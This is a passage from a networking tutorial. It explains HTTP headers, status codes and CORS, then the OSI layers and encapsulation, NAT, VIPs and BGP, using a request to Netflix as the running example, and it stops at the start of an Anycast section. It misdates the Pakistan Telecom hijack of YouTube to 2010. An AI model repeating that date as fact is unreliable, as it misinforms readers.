#### QUIC Benefits

- **0-RTT connection establishment** (for returning users — TLS 1.3 PSK combined with QUIC handshake in one go)
- **Connection migration**: Your connection survives IP address changes (switching from Wi-Fi to 4G). The QUIC connection ID remains stable even when your IP changes.
- **Better performance on lossy networks** (mobile, satellite)
- **Multiplexing without head-of-line blocking**

```
QUIC handshake (new connection):
  Client → Server: QUIC Initial + ClientHello  (QUIC + TLS combined)
  Server → Client: QUIC Handshake + ServerHello + Certificate + Finished
  Client → Server: Finished + [HTTP/3 request]
  = 1 RTT total (TCP + TLS 1.3 = 2 RTTs)

QUIC 0-RTT (returning user):
  Client → Server: QUIC Initial + [HTTP/3 request]  (0 RTT!)
```

---

### HTTP Request — Full Anatomy

#### Request Methods

| Method | Purpose | Body? | Idempotent? | Safe? |
|---|---|---|---|---|
| `GET` | Fetch a resource | No | Yes | Yes |
| `POST` | Create / submit data | Yes | No | No |
| `PUT` | Replace a resource | Yes | Yes | No |
| `PATCH` | Partially update | Yes | No | No |
| `DELETE` | Remove a resource | Sometimes | Yes | No |
| `HEAD` | Get headers only (no body) | No | Yes | Yes |
| `OPTIONS` | Ask what methods are allowed | No | Yes | Yes |
| `CONNECT` | Open a tunnel (used by proxies for HTTPS) | No | No | No |

**Safe** = does not change server state (GET, HEAD, OPTIONS).
**Idempotent** = calling it multiple times has the same result (GET, PUT, DELETE).

#### Full Annotated Request

```http
GET / HTTP/2
:method: GET                        ← HTTP/2 pseudo-headers use : prefix
:path: /
:scheme: https
:authority: www.netflix.com

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
            AppleWebKit/537.36 (KHTML, like Gecko)
            Chrome/120.0.0.0 Safari/537.36
            ↑ Identifies browser and OS. Servers may serve different content per UA.

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8
        ↑ What content types the browser can handle.
          q= is quality factor (preference weight, 0–1).
          "I prefer text/html, but I'll accept anything"

Accept-Language: en-US,en;q=0.9,fr;q=0.7
                 ↑ Preferred languages in priority order.

Accept-Encoding: gzip, br, zstd
                 ↑ Compression algorithms supported.
                   br = Brotli (Google's algorithm, 20% better than gzip)
                   zstd = Zstandard (Facebook's algorithm, very fast)

Cache-Control: no-cache
               ↑ Force server to send fresh content.
                 "no-cache" means "revalidate, don't serve stale"
                 "no-store" means "don't cache at all"

Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
                ↑ Browser security headers. Prevent CSRF.
                  Tells server context of this request (navigation, fetch, etc.)

Sec-CH-UA: "Chromium";v="120", "Google Chrome";v="120"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
                   ↑ Client Hints — more structured UA info.

Cookie: nfvdid=XYZ123; NetflixId=ABC456; SecureNetflixId=DEF789
        ↑ Session state. Sent with every request to same domain.
          NetflixId = your session token. HttpOnly cookie — JS cannot read it.

Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...
               ↑ JWT token for API requests. Contains encoded user info.

Referer: https://www.netflix.com/
         ↑ Which page sent you here (same-origin navigation).
           Stripped for cross-origin requests (Referrer-Policy).

Origin: https://www.netflix.com
        ↑ For CORS (cross-origin resource sharing) checks.

Upgrade-Insecure-Requests: 1
        ↑ "If you redirect me, please redirect to HTTPS."

Connection: keep-alive
            ↑ HTTP/1.1 header — keep TCP connection open for reuse.
              In HTTP/2, always multiplexed — this header is ignored.

DNT: 1
     ↑ Do Not Track preference. Mostly ignored by servers.
```

---

### HTTP Response — Full Anatomy

```http
HTTP/2 200 OK

Content-Type: text/html; charset=UTF-8
              ↑ What kind of content is in the body.
                charset=UTF-8 tells browser how to decode bytes.

Content-Length: 45231
                ↑ Exact size of body in bytes.
                  OR use Transfer-Encoding: chunked for streaming responses.

Content-Encoding: br
                  ↑ Body is Brotli-compressed. Browser decompresses before rendering.

# ── CACHING ────────────────────────────────────────────────────────────────

Cache-Control: no-store, no-cache, must-revalidate
               ↑ Don't cache this response. Netflix's HTML is personalized —
                 different user gets different content.

Cache-Control: public, max-age=31536000, immutable
               ↑ (For static assets like /app.abc123.js)
                 Cache for 1 year. "immutable" = browser never revalidates.
                 Safe because the filename contains a content hash.

ETag: "abc123def456"
      ↑ A fingerprint of the response. Browser sends it next request:
        If-None-Match: "abc123def456"
        Server: 304 Not Modified (no body) if unchanged.

Last-Modified: Tue, 22 Apr 2026 10:00:00 GMT
               ↑ When this resource last changed.
                 Browser can send If-Modified-Since header to check.

Vary: Accept-Encoding
      ↑ "This response differs based on Accept-Encoding."
        Caches must store separate copies per encoding.

Age: 0
     ↑ How many seconds this response has been in a cache.
       0 = fresh from origin.

# ── SECURITY ───────────────────────────────────────────────────────────────

Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
                           ↑ HSTS. Browser must use HTTPS for this domain
                             for the next year. Even if you type http://.
                             preload: this domain is in browsers' hardcoded
                             HSTS preload list — HTTPS enforced from the
                             very first request, ever.

Content-Security-Policy: default-src 'self';
                         script-src 'self' *.nflxvideo.net 'nonce-abc123';
                         img-src 'self' *.nflximg.net data:;
                         connect-src 'self' api.netflix.com;
                         frame-ancestors 'none'
  ↑ CSP. Whitelist of sources for each resource type.
    Prevents XSS: even if attacker injects a <script> tag, browser blocks it
    if the source isn't whitelisted.
    nonce-abc123: inline scripts must have this nonce attribute.

X-Frame-Options: DENY
                 ↑ This page cannot be embedded in an iframe on another site.
                   Prevents clickjacking attacks.
                   Superseded by CSP frame-ancestors, but kept for older browsers.

X-Content-Type-Options: nosniff
                         ↑ Browser must not try to guess content type.
                           Only interpret response as declared Content-Type.
                           Prevents MIME confusion attacks.

Referrer-Policy: strict-origin-when-cross-origin
                 ↑ Only send origin (not full URL) as Referer on cross-origin requests.
                   Full URL sent for same-origin. Nothing sent for downgrade (HTTPS→HTTP).

Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=()
                    ↑ Deny browser APIs to this page and its embedded content.
                      Even if JS tries navigator.geolocation, browser blocks it.

# ── CORS ────────────────────────────────────────────────────────────────────

Access-Control-Allow-Origin: https://www.netflix.com
                              ↑ Only this origin may read the response cross-origin.
                                Use * to allow any origin (not for credentialed requests).

Access-Control-Allow-Credentials: true
                                   ↑ Cookies/auth headers included in cross-origin requests.

Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
Access-Control-Max-Age: 86400
                         ↑ Preflight result cached for 24 hours.

# ── COOKIES ─────────────────────────────────────────────────────────────────

Set-Cookie: nfvdid=XYZ123;
            Max-Age=31536000;        ← expires in 1 year
            Domain=.netflix.com;     ← shared across all netflix.com subdomains
            Path=/;
            Secure;                  ← only sent over HTTPS
            HttpOnly;                ← JavaScript cannot read this cookie
            SameSite=None            ← sent on cross-site requests (needed for embeds)
  ↑ SameSite=Strict: only same-site requests (strongest CSRF protection)
    SameSite=Lax: sent on top-level navigation (good default)
    SameSite=None: sent everywhere (requires Secure)

# ── TRACING & INFRA ─────────────────────────────────────────────────────────

Server: nginx
        ↑ No version number — don't reveal exact version to attackers.

X-Netflix-Request-Id: abc-123-def-456
                       ↑ Correlation ID. Used to trace this request through
                         Netflix's internal logs and distributed tracing systems.

Via: 1.1 netflix-edge-pop-1.netflix.com (EGW)
     ↑ Which proxies forwarded this response.

X-Response-Time: 43ms
                 ↑ How long origin took to process this request.
```

---

### HTTP Status Codes — The Complete Picture

#### 1xx — Informational
| Code | Name | Meaning |
|---|---|---|
| `100` | Continue | Server received headers, send the body |
| `101` | Switching Protocols | Upgrading to WebSocket |

#### 2xx — Success
| Code | Name | Meaning |
|---|---|---|
| `200` | OK | Standard success |
| `201` | Created | Resource was created (POST) |
| `204` | No Content | Success but no body (DELETE) |
| `206` | Partial Content | Range request served (video seeks) |

#### 3xx — Redirection
| Code | Name | Meaning | Cached? |
|---|---|---|---|
| `301` | Moved Permanently | Resource at new URL forever | YES |
| `302` | Found | Temporary redirect | NO |
| `304` | Not Modified | Use your cached copy | N/A |
| `307` | Temporary Redirect | Like 302 but must keep method | NO |
| `308` | Permanent Redirect | Like 301 but must keep method | YES |

#### 4xx — Client Errors
| Code | Name | Common Cause |
|---|---|---|
| `400` | Bad Request | Malformed request syntax |
| `401` | Unauthorized | Not logged in / invalid token |
| `403` | Forbidden | Logged in but not allowed (geo-block) |
| `404` | Not Found | Wrong URL |
| `405` | Method Not Allowed | POSTing to a GET-only endpoint |
| `408` | Request Timeout | Client too slow |
| `409` | Conflict | Resource state conflict |
| `410` | Gone | Resource permanently deleted |
| `413` | Payload Too Large | Request body too big |
| `415` | Unsupported Media Type | Wrong Content-Type |
| `422` | Unprocessable Entity | Syntactically valid but semantically wrong |
| `429` | Too Many Requests | Rate limited |

#### 5xx — Server Errors
| Code | Name | Common Cause |
|---|---|---|
| `500` | Internal Server Error | Bug in server code |
| `502` | Bad Gateway | Upstream (origin) returned invalid response |
| `503` | Service Unavailable | Server overloaded or down |
| `504` | Gateway Timeout | Upstream didn't respond in time |

---

### CORS — Cross-Origin Resource Sharing

A web page at `https://netflix.com` wants to make an API call to `https://api.netflix.com`. These are different origins (different subdomain). The **Same-Origin Policy** blocks this by default.

**CORS** is a mechanism that lets servers explicitly permit cross-origin requests.

```
Browser is on: https://www.netflix.com
Browser wants to fetch: https://api.netflix.com/users/me

Step 1: Browser sends a Preflight request (OPTIONS):
  OPTIONS /users/me HTTP/2
  Origin: https://www.netflix.com
  Access-Control-Request-Method: GET
  Access-Control-Request-Headers: Authorization

Step 2: api.netflix.com responds:
  Access-Control-Allow-Origin: https://www.netflix.com   ← "yes, I allow this origin"
  Access-Control-Allow-Methods: GET, POST
  Access-Control-Allow-Headers: Authorization
  Access-Control-Max-Age: 86400   ← cache this preflight result for 24h

Step 3: Browser sends the actual GET request.
Step 4: Response returned to JavaScript.

If Step 2 fails (origin not allowed):
  Browser blocks the response. Network tab shows CORS error.
  Server DID receive the request — CORS is enforced by the browser, not the server.
```

Simple requests (GET/POST with basic headers) skip the preflight. Complex requests (PUT, DELETE, custom headers) require it.

---

### Across the series

- **Speak HTTP/1.1 by hand** and decode `Content-Length` vs chunked framing:
  `rawhttp`, [TCP/IP guide, Chapter 28](../networking/tcp-ip/real-life-guide-v1.md#chapter-28-http-how-the-web-actually-talks).
- **Time every phase** of a real request (DNS, TCP, TLS, TTFB) and watch
  connection reuse: this guide's `httptrace` lab in [Chapter 17](#chapter-17-debugging-the-lifecycle-browser-devtools-curl-openssl-packet-capture-and-logs).
- **See which versions a site offers** and how HTTP/3 is discovered:
  `protoprobe` in [Chapter 14](#chapter-14-http-version-negotiation-http-1-1-http-2-http-3-alt-svc-and-fallbacks).
- **What happens when two parsers disagree about framing**: request
  smuggling, in [Chapter 20](#chapter-20-reverse-proxies-in-go-the-client-s-identity-framing-and-request-smuggling).
- **Go's `net/http` from the ground up:** [Go guide §24](../Golang/real-life-golang-guide.md#24-net-http-fundamentals-client-server-middleware) and the
  Go plan's [Week 9](../Golang/detailed-90-day-plan/week9.md) (raw HTTP server, middleware, reverse proxy, HTTP/2).

### Key Takeaways

- HTTP is the language of the web. Request = method + headers + body. Response = status + headers + body.
- **HTTP/2** solves HTTP/1.1 head-of-line blocking with multiplexed streams over one TCP connection.
- **HTTP/3 (QUIC)** runs over UDP, eliminates TCP head-of-line blocking, and supports 0-RTT.
- **Request headers** carry metadata: who the client is, what format it accepts, cookies, auth tokens.
- **Response headers** carry: content type, caching rules, security policies (HSTS, CSP, CORS), cookies.
- **Cache-Control** headers dictate whether and how long clients and caches store responses.
- **Security headers** (HSTS, CSP, X-Frame-Options, SameSite cookies) are your browser-side attack surface.
- **CORS** is browser-enforced — prevents malicious sites from making credentialed requests to your banking API.
- **Status codes** are contracts — `4xx` usually means the request cannot be
  accepted as sent, while `5xx` means the server or upstream path failed to
  fulfill an otherwise valid request. Misclassified errors are common in real
  systems.

---

## Chapter 6 — OSI Layers: The Network Stack

> The OSI model is a way of thinking about how data travels across a network, broken into 7 layers. Each layer has a specific job and talks to the layers above and below it.

---

### The Simple Version (5-year-old)

Imagine sending a birthday gift to a friend:

- **You write a card** (application — your message).
- **You put it in a box** (presentation — packaged properly).
- **You label it with a tracking number** (session — identify this shipment).
- **You put it in a truck** (transport — moves it reliably).
- **The truck follows road signs** (network — routing).
- **The truck drives on the actual road** (data link — the physical network).
- **The road itself** (physical — the wire/fiber/air).

Data works the same way — each layer wraps the data from the layer above and hands it down to the layer below.

---

### The OSI Model vs The TCP/IP Model

The **OSI model** is a theoretical 7-layer framework. The **TCP/IP model** is what the internet actually uses — 4 layers that map onto OSI.

```
OSI Model                    TCP/IP Model         Protocols
┌─────────────────────┐      ┌──────────────────┐
│ L7  Application     │      │                  │  HTTP, HTTPS, DNS, FTP, SMTP
├─────────────────────┤      │  Application     │  WebSocket, gRPC, SSH
│ L6  Presentation    │      │                  │  TLS/SSL, gzip, JSON, Base64
├─────────────────────┤      ├──────────────────┤
│ L5  Session         │      │  (part of App)   │  TLS sessions, RPC sessions
├─────────────────────┤      ├──────────────────┤
│ L4  Transport       │      │  Transport       │  TCP, UDP, QUIC, SCTP
├─────────────────────┤      ├──────────────────┤
│ L3  Network         │      │  Internet        │  IPv4, IPv6, ICMP, BGP
├─────────────────────┤      ├──────────────────┤
│ L2  Data Link       │      │                  │  Ethernet, Wi-Fi (802.11)
├─────────────────────┤      │  Network Access  │  ARP, PPP, VLAN (802.1Q)
│ L1  Physical        │      │                  │  Copper, Fiber, Radio waves
└─────────────────────┘      └──────────────────┘
```

In practice, engineers talk about layers using OSI numbers (L3, L4, L7) even when they mean the TCP/IP model. "L7 load balancer" means it operates at the Application layer.

> Important note: TLS doesn't fit neatly into OSI. TLS spans functionality across L4-L7 — session establishment (L5), encryption/encoding (L6), and application security (L7). In practice, just think of TLS as "between TCP and HTTP."

---

### Encapsulation — Wrapping Data as It Goes Down

When data travels from your browser to Netflix, each layer **wraps** the data from the layer above with its own header. This is **encapsulation**.

```
Your HTTP GET request (bytes)
        │
        │ L6/L7: TLS wraps it
        ▼
[TLS Record Header | Encrypted HTTP data]
        │
        │ L4: TCP wraps it
        ▼
[TCP Header | TLS Record]
        │
        │ L3: IP wraps it
        ▼
[IP Header | TCP Header | TLS Record]
        │
        │ L2: Ethernet wraps it
        ▼
[Ethernet Frame Header | IP Header | TCP Header | TLS Record | FCS]
        │
        │ L1: transmitted as bits
        ▼
10110101 00011011 ... (electrical signal on wire / light on fiber / radio waves)
```

On the receiving end, each layer **unwraps** (decapsulates):

```
Bits arrive at Netflix's server
  → L1 converts to bytes
  → L2 strips Ethernet header, checks FCS
  → L3 strips IP header, checks destination IP
  → L4 strips TCP header, reorders segments
  → L6 decrypts TLS
  → L7 parses HTTP request
  → Application processes "GET /"
```

---

### Layer 1 — Physical

**What it does:** Transmits raw bits (0s and 1s) over a physical medium.

**Doesn't know about:** Addresses, packets, protocols. Just bits.

**Media types:**
```
Copper wire (Cat5e/Cat6):   Electrical voltage changes represent bits
                            Max: 10 Gbps (10GBASE-T), ~100m distance

Fiber optic:                Pulses of light represent bits
                            Single-mode: 10–400 Gbps, 100+ km distance
                            Multi-mode:  10–100 Gbps, ~500m distance

Wi-Fi (802.11ax/Wi-Fi 6):  Radio waves at 2.4 GHz / 5 GHz / 6 GHz
                            Max: ~9.6 Gbps theoretical (real-world ~1-2 Gbps)

5G NR:                      Radio waves, licensed spectrum
                            Max: ~20 Gbps theoretical (real-world ~500 Mbps)
```

**Devices at L1:** Network interface card (NIC), hubs (dumb repeaters), antennas, modems.

**In Netflix's journey:** Your bytes travel as light pulses in fiber optic cables under the ocean between continents.

---

### Layer 2 — Data Link

**What it does:** Transfers data between two directly connected devices (same network). Handles framing, addressing within the local network, and error detection.

**Key concept: MAC address** — a hardware address (48 bits, like `00:1A:2B:3C:4D:5E`), unique per network interface card. Used for addressing within a local network.

#### Ethernet Frame Structure

```
┌──────────────┬──────────────┬──────────────┬────────────────┬─────┐
│ Dst MAC      │ Src MAC      │ EtherType    │ Payload        │ FCS │
│ (6 bytes)    │ (6 bytes)    │ (2 bytes)    │ (46-1500 bytes)│ 4B  │
└──────────────┴──────────────┴──────────────┴────────────────┴─────┘
```

- **Dst/Src MAC**: Who this frame is for, who sent it (within local network only).
- **EtherType**: What's inside — `0x0800` = IPv4, `0x86DD` = IPv6, `0x0806` = ARP.
- **FCS (Frame Check Sequence)**: CRC checksum to detect bit errors. Corrupted frames are dropped.

#### ARP — Address Resolution Protocol

When your laptop wants to send a packet to `192.168.1.1` (your router), it needs the router's MAC address first.

```
Your laptop broadcasts (to all devices on LAN):
  "Who has IP 192.168.1.1? Tell 192.168.1.105"

Router responds (unicast):
  "I have 192.168.1.1. My MAC is 00:11:22:33:44:55"

Your laptop caches this (ARP cache) and uses MAC 00:11:22:33:44:55 for the frame.
```

Note: When your packet leaves your local network, L2 Dst MAC changes at every hop — each router rewrites the Ethernet frame with the next router's MAC. The L3 IP addresses don't change (except with NAT).

**Devices at L2:** Switches (MAC address tables, forward frames to the right port), Wi-Fi access points, bridges.

#### VLANs — Virtual Local Area Networks

A VLAN logically divides one physical network into isolated segments. Frames carry a VLAN tag (802.1Q):

```
[Dst MAC | Src MAC | 0x8100 VLAN tag | VLAN ID (12-bit) | EtherType | Payload | FCS]
```

A datacenter might use VLANs to separate traffic types: management traffic on
one VLAN, web traffic on another, storage traffic on another — isolated even on
the same physical switches.

---

### Layer 3 — Network

**What it does:** Routes packets from source to destination **across multiple networks**. This is where the internet happens.

**Key protocols:** IPv4, IPv6, ICMP, BGP, OSPF.

#### IPv4 Packet Structure

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌────────┬─────────┬──────────────────────────────────────────────┐
│Version │  IHL   │ DSCP / ECN        │     Total Length          │
├────────┴─────────┴──────────────────────────────────────────────┤
│        Identification               │Flags│  Fragment Offset    │
├─────────────────────────────────────────────────────────────────┤
│      TTL          │    Protocol     │       Header Checksum     │
├─────────────────────────────────────────────────────────────────┤
│                      Source IP Address                          │
├─────────────────────────────────────────────────────────────────┤
│                    Destination IP Address                       │
└─────────────────────────────────────────────────────────────────┘
```

Key fields:
- **TTL**: Decremented at each router. Packet dropped when 0. Prevents routing loops.
- **Protocol**: What's inside — `6` = TCP, `17` = UDP, `1` = ICMP.
- **Source/Dest IP**: The globally routable addresses. These don't change across the internet (except at NAT).
- **DSCP**: Differentiated Services Code Point — Quality of Service marking. Netflix marks video packets with a higher priority so routers handle them before background traffic.

#### IPv6 Packet Structure

```
┌──────────┬───────────────┬───────────────┬───────────────────────┐
│ Version  │ Traffic Class │  Flow Label   │                       │
├──────────┴───────────────┴───────────────┤  Payload Length       │
│  Next Header  │  Hop Limit               │                       │
├───────────────┴──────────────────────────┴───────────────────────┤
│                                                                  │
│                    Source IPv6 Address (128 bits)                │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│                  Destination IPv6 Address (128 bits)             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

IPv6 improvements over IPv4:
- Fixed 40-byte header (no variable-length options) — faster routing
- No fragmentation at routers (done at source only)
- No broadcast — uses multicast
- Built-in IPsec support
- No ARP — uses NDP (Neighbor Discovery Protocol)

#### ICMP — Internet Control Message Protocol

ICMP is L3's "error and diagnostic" protocol. Lives inside IP packets (Protocol=1).

```
ping www.netflix.com
  → Sends ICMP Echo Request to 52.38.36.82
  ← Receives ICMP Echo Reply
  → Measures RTT (Round-Trip Time)

traceroute www.netflix.com
  → Sends packets with TTL=1 (dies at first router → ICMP Time Exceeded)
  → Sends packets with TTL=2 (dies at second router)
  → ... until destination reached
  → Maps the path and latency at each hop
```

**Devices at L3:** Routers, Layer 3 switches, firewalls (inspect IP addresses).

---

### Layer 4 — Transport

**What it does:** End-to-end communication between applications. Multiplexes multiple conversations over one IP address using **ports**. TCP adds reliability; UDP adds speed.

Already covered in depth in Chapter 3 (TCP: Reliable Delivery).

Key addition — **stateful firewalls** live at L4:

```
Firewall rule example:
  ALLOW TCP from 0.0.0.0/0 to 10.0.4.55 port 443   (incoming HTTPS)
  ALLOW TCP from 10.0.4.55 to 0.0.0.0/0 (ESTABLISHED, RELATED)  (return traffic)
  DENY all other

Stateful = firewall tracks TCP state machine.
  SYN from outside → creates state table entry.
  Response ACK from inside → matches state → allowed.
  SYN from outside with no prior SYN → rejected (no state entry).
```

**Devices at L4:** Firewalls, L4 load balancers, NAT routers.

---

### Layer 5 — Session

**What it does:** Manages sessions — persistent, stateful conversations between applications. Establishes, maintains, and terminates sessions.

In practice, this layer is rarely spoken of separately. TLS session management, HTTP keep-alive, WebSocket connections, and database sessions all fit here conceptually.

---

### Layer 6 — Presentation

**What it does:** Data translation, encoding, and encryption. Makes sure sender's data format is understood by receiver.

In practice:
- **TLS/SSL encryption** (encrypts L7 data)
- **Compression** (gzip, Brotli)
- **Character encoding** (UTF-8, ASCII)
- **Serialization** (JSON → bytes, Protobuf, XML)

---

### Layer 7 — Application

**What it does:** The actual protocol your application uses. This is where HTTP, DNS, SMTP, WebSocket, gRPC live.

This is the layer you write code against as a web developer. HTTP request methods, headers, status codes — all L7.

**Devices at L7:** Web servers (Nginx, Apache), API gateways, L7 load balancers, WAFs (Web Application Firewalls), CDNs.

---

### Where Devices Operate

```
L7   WAF, API Gateway, L7 Load Balancer, CDN, Web Server, App Server
     (read HTTP headers, URLs, cookies — full request inspection)
     │
L6   TLS terminator (Nginx, Envoy)
     (decrypt/encrypt, compress/decompress)
     │
L5   Session manager
     (TLS session resumption, connection pools)
     │
L4   L4 Load Balancer, Firewall, NAT
     (read TCP/UDP, ports — no content inspection)
     │
L3   Router
     (read IP addresses only — just forward the packet)
     │
L2   Switch
     (read MAC addresses — forward within local network)
     │
L1   Hub, NIC, fiber, copper, Wi-Fi radio
     (just move bits)
```

The **higher the layer**, the more a device knows about your traffic — and the more it can do (inspect, block, route by content). The **lower the layer**, the faster and dumber the device.

---

### Real Packet Journey for Your Netflix Request

```
Your browser creates:  GET / HTTP/2   (L7)
TLS encrypts it        (L6)
TCP segments it        (L4): [SrcPort:54321 DstPort:443 Seq:1000 | encrypted data]
IP wraps it            (L3): [SrcIP:192.168.1.105 DstIP:52.38.36.82 | TCP segment]
Ethernet frames it     (L2): [SrcMAC:aa:bb:cc DstMAC:router-MAC | IP packet | FCS]
NIC sends bits         (L1): 10110101 00011011...

→ Your router (L2 switch + L3 router):
   L2: receives frame, strips Ethernet header
   L3: reads IP, performs S-NAT (192.168.1.105 → 203.0.113.45)
       looks up routing table, forwards to ISP
   L2: re-wraps with new Ethernet frame to ISP's MAC

→ ISP router (L3 only):
   L3: reads IP, looks up routing table
   Forwards toward Netflix's AS

→ Netflix border router (L3):
   L3: reads IP, routes to edge server

→ Netflix edge / L4 LB:
   L4: receives TCP SYN, creates connection state
       performs D-NAT: 52.38.36.82 → 10.0.4.55

→ Netflix edge / TLS terminator (L6):
   Decrypts TLS → plain HTTP

→ Netflix L7 load balancer (L7):
   Reads HTTP headers → routes to correct backend

→ Netflix origin server (L7):
   Nginx / Zuul / Node.js processes HTTP request
   Returns HTML response

→ Same journey in reverse back to your browser

→ Your browser renders the HTML (L7)
```

---

### Across the series

The [OSI guide](../networking/real-life-example-osi.md) is a whole guide on this chapter's topic. It follows one
"Place order" click through all seven layers with real addresses, a
millisecond timeline, a byte-by-byte encapsulation budget, a hop-by-hop
table of which header fields each device rewrites, and a debugging playbook
organised by layer.

### Key Takeaways

- The OSI model has 7 layers. In practice, TCP/IP collapses them to 4.
- **L1–L2** (Physical, Data Link): Move bits and frames on a local network. Switches, NICs, cables.
- **L3** (Network): Route packets across networks. Routers use IP addresses.
- **L4** (Transport): End-to-end connection. TCP (reliable) or UDP (fast). Ports identify applications.
- **L5–L6** (Session, Presentation): TLS, compression, encoding. Often treated as part of L7 in practice.
- **L7** (Application): HTTP, DNS, SMTP. What your application code directly talks.
- **Encapsulation**: Each layer wraps data from above. Decapsulation strips headers on the way up.
- Higher layer = more intelligence = more features. Lower layer = less intelligence = more speed.
- MAC addresses (L2) change at each hop. IP addresses (L3) stay the same end-to-end (except NAT).

---

# Part 4 — Global traffic routing

So far, "the internet routes your packet to Netflix" was a black box. This
part opens it: NAT translates addresses at every hop, BGP is the protocol
that actually decides the path, anycast lets one IP exist in many places at
once, and VRRP keeps a single datacenter's gateway alive when a router
dies. These four mechanisms nest inside each other, and the chapter's
closing section walks your Netflix request through all of them in sequence.

## Chapter 7 — NAT, VIP, BGP, Anycast & VRRP: Global Traffic Routing

> How does your request find Netflix's servers across the world? And how does Netflix make sure a single server failure doesn't take down the site? These mechanisms answer both questions.

---

### The Simple Version (5-year-old)

Imagine a pizza chain called Netflix Pizza:

- **NAT**: Your apartment building has one street address, but 50 apartments. The doorman (your router) knows which apartment to deliver to. *S-NAT* = when you order from inside, doorman writes the building address (not your apartment). *D-NAT* = when the pizza arrives at the building, doorman delivers it to your specific apartment.

- **VIP**: Netflix Pizza has one phone number (800-NETFLIX) advertised everywhere. But that phone connects to whichever branch is nearest to you. The phone number never changes — but you always reach a local branch.

- **BGP**: The phone company's routing system. It decides which branch (which city) your call goes to when you dial 800-NETFLIX.

- **Anycast**: Multiple Netflix Pizza branches exist in your city, and they all advertise the same address. BGP routes you to the nearest one.

- **VRRP**: Inside each branch, there are two managers (Master and Backup). If the Master gets sick, the Backup immediately takes over. Customers never notice.

---

### NAT — Network Address Translation

Covered in detail in Chapter 1 (How the Internet Works). Quick summary:

#### S-NAT (Source NAT) — Your Home Router

```
Your laptop         Router performs S-NAT        Netflix server
192.168.1.105:54321 ──────────────────────────► 52.38.36.82:443
                     rewrites source:
                     192.168.1.105:54321
                     → 203.0.113.45:54321
```

NAT table entry created:
```
Private                    Public                      External
192.168.1.105:54321   ←→  203.0.113.45:54321   ←→   52.38.36.82:443
```

Return traffic: Netflix responds to `203.0.113.45:54321`. Router looks up NAT table. Delivers to `192.168.1.105:54321`.

**Why S-NAT exists:** IPv4 address exhaustion. One public IP, many private devices.

#### D-NAT (Destination NAT) — Netflix's Load Balancer

```
Your request arrives at Netflix VIP:  Dst=52.38.36.82:443
Netflix LB rewrites destination:       Dst=10.0.4.55:443  (real backend)

This is D-NAT: rewriting the DESTINATION address.
```

**Why D-NAT:** One public VIP fans out to hundreds of private backend servers. This is the foundation of load balancing at L4.

#### PAT — Port Address Translation

A more specific form of S-NAT used by home routers. Multiple internal devices share ONE public IP — differentiated by different source ports.

```
Device A:  192.168.1.105:54321 → 203.0.113.45:54321  → Netflix
Device B:  192.168.1.107:54321 → 203.0.113.45:54322  → Netflix
Device C:  192.168.1.109:8080  → 203.0.113.45:54323  → Netflix

All three map to the SAME public IP but different source ports.
Router tracks all three in its NAT table.
```

---

### VIP — Virtual IP Address

A **VIP** is an IP address that is **not permanently assigned to any single server or physical interface**. It is a floating address that can be held by different servers at different times.

#### Why VIPs Exist

Without a VIP:
```
You connect to real server IP: 10.0.4.55
Server crashes → your connection is dead
You must reconnect to a different IP: 10.0.4.56
You (and DNS) must know about multiple individual servers
```

With a VIP:
```
You connect to VIP: 52.38.36.82
VIP is held by whoever is healthy (load balancer or any server in the cluster)
One server crashes → VIP moves to another (VRRP) or load balancer removes it from pool
You stay connected to 52.38.36.82 — you never know which real server answered
```

#### Two Uses of VIP

**1. External VIP** — the public IP users connect to:
```
52.38.36.82  (advertised via BGP to the internet)
  → D-NAT → real servers inside (10.0.4.x range)
```

**2. Internal VIP / Cluster VIP** — inside the datacenter, for VRRP failover:
```
10.0.0.1  (internal VIP — held by VRRP master gateway)
  → If master fails, backup assumes 10.0.0.1
  → Internal servers still route through 10.0.0.1
```

---

### BGP — Border Gateway Protocol

#### What BGP Is

BGP is the **routing protocol of the internet** — the system by which routers across the world exchange information about which IP address ranges they own and how to reach them.

Every company on the internet that owns IP addresses and runs its own routers has an **Autonomous System Number (ASN)**:
```
Netflix:  AS2906
Google:   AS15169
Comcast:  AS7922
AT&T:     AS7018
Amazon:   AS16509
```

BGP lets these Autonomous Systems tell each other: **"I own these IP prefixes. To reach them, send traffic to me."**

#### BGP Route Announcement

```
Netflix (AS2906) announces to its BGP peers:
  "Prefix: 52.38.0.0/19 is reachable via AS2906"
  "Prefix: 198.38.96.0/19 is reachable via AS2906"

Your ISP (AS7922 — Comcast) receives this announcement.
Comcast's router adds to its BGP routing table:
  52.38.0.0/19  → next hop: AS2906 (Netflix)

When you request 52.38.36.82:
  Comcast router looks up 52.38.0.0/19 → forwards to Netflix
```

#### BGP Path Selection

Multiple paths to Netflix may exist. BGP selects the "best path" using a series of attributes (in order of preference):

```
1. Highest LOCAL_PREF     (prefer traffic leaving through preferred interface)
2. Shortest AS_PATH       (fewest hops through autonomous systems)
3. Lowest MED             (Multi-Exit Discriminator — server's preference)
4. eBGP over iBGP         (prefer external peers over internal)
5. Lowest IGP cost        (prefer closest next-hop internally)
6. Lowest Router ID       (tiebreaker)
```

Large networks use these attributes to **engineer traffic** — shifting load
between ISP peers based on cost, capacity, policy, and performance.

#### BGP Convergence Time

When a BGP route is withdrawn (e.g., Netflix takes a POP offline), it takes **30–120 seconds** for all routers worldwide to converge to the new routes. This is the fundamental speed limit of internet-level failover.

#### BGP Security — RPKI

BGP was designed without authentication. An AS can announce prefixes it doesn't own — this is called a **BGP hijack**. In 2010, Pakistan Telecom accidentally hijacked YouTube's IP space, taking YouTube offline globally.

**RPKI (Resource Public Key Infrastructure)**: Allows IP address holders to publish cryptographically signed certificates (ROAs — Route Origin Authorizations) stating which ASes are authorized to announce their prefixes. Routers that validate RPKI will reject unauthorized announcements.

---

### Anycast — One IP, Many Locations

#### What Anycast Is

